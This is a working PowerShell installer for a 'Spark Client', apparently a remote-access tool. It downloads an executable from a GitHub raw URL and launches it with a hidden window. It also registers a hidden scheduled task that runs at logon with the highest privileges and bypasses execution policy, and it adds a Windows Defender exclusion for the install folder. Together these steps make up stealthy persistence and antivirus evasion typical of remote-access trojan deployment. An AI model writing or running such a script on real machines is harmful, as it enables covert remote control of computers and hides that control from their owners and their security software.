# install-spark-client.ps1
# Auto install Spark Client on Windows
# - Download client.zip from GitHub
# - Extract client.exe to C:\Program Files\Spark
# - Create run-client.ps1 wrapper to launch hidden
# - Register scheduled task at user logon (hidden, highest privileges)
# - Add Windows Defender exclusion

$RepoUrl = "https://raw.githubusercontent.com/tutamdev/remote-desktop/main"
$ZipUrl  = "$RepoUrl/client.zip"
$TempZip = Join-Path $env:TEMP "client.zip"

$DestDir = "C:\Program Files\Spark"
$DestExe = Join-Path $DestDir "client.exe"
$Wrapper = Join-Path $DestDir "run-client.ps1"
$TaskName = "SparkClient"

$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

Write-Host ">>> Installing Spark Client for user: $CurrentUser"

# 1. Create destination folder
if (!(Test-Path -Path $DestDir)) {
    Write-Host ">>> Creating folder: $DestDir"
    New-Item -Path $DestDir -ItemType Directory -Force | Out-Null
}

# 2. Download client.zip
Write-Host ">>> Downloading client.zip from $ZipUrl"
Invoke-WebRequest -Uri $ZipUrl -OutFile $TempZip -UseBasicParsing

# 3. Extract zip
Write-Host ">>> Extracting client.exe to $DestDir"
Expand-Archive -Path $TempZip -DestinationPath $DestDir -Force

# 4. Stop any running client
Write-Host ">>> Stopping existing client process (if any)"
Get-Process -Name "client" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

# 5. Create wrapper script (run hidden)
Write-Host ">>> Creating wrapper script: $Wrapper"
@"
Start-Process -FilePath `"$DestExe`" -WindowStyle Hidden
"@ | Out-File -FilePath $Wrapper -Encoding UTF8 -Force

# 6. Remove old scheduled task if exists
if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
    Write-Host ">>> Removing old scheduled task: $TaskName"
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
}

# 7. Register scheduled task (run hidden at logon)
Write-Host ">>> Registering scheduled task: $TaskName"
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$Wrapper`""
$Trigger = New-ScheduledTaskTrigger -AtLogOn -User $CurrentUser
$Settings = New-ScheduledTaskSettingsSet -Hidden -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
$Principal = New-ScheduledTaskPrincipal -UserId $CurrentUser -LogonType Interactive -RunLevel Highest

Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal

# 8. Add Defender exclusion
Write-Host ">>> Adding Windows Defender exclusion: $DestDir"
try {
    Add-MpPreference -ExclusionPath $DestDir
    Write-Host ">>> Defender exclusion added successfully."
} catch {
    Write-Warning ">>> Failed to add Defender exclusion (please run PowerShell as Administrator)."
}

Write-Host ">>> Done. Spark Client will auto-start hidden when $CurrentUser logs in."
